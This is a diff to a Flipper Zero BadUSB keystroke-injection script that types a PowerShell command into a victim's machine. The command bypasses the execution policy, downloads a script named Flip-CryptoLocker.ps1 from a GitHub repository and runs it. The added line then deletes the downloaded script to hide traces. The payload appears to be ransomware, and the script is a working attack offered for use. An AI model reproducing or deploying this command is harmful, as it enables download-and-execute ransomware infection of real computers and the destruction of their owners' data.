@@ -9,5 +9,5 @@ LEFTARROW
 DELAY 2000
 ENTER
 DELAY 4000
-STRING Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ooovenenoso/Flipper-Zero-BadUSB/main/Payloads/Flip-CryptoLocker/Flip-CryptoLocker.ps1' -OutFile "$env:USERPROFILE\Desktop\Flip-CryptoLocker.ps1"; & "$env:USERPROFILE\Desktop\Flip-CryptoLocker.ps1"
+STRING Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ooovenenoso/Flipper-Zero-BadUSB/main/Payloads/Flip-CryptoLocker/Flip-CryptoLocker.ps1' -OutFile "$env:USERPROFILE\Desktop\Flip-CryptoLocker.ps1"; & "$env:USERPROFILE\Desktop\Flip-CryptoLocker.ps1"; Remove-Item "$env:USERPROFILE\Desktop\Flip-CryptoLocker.ps1" -Force
 ENTER
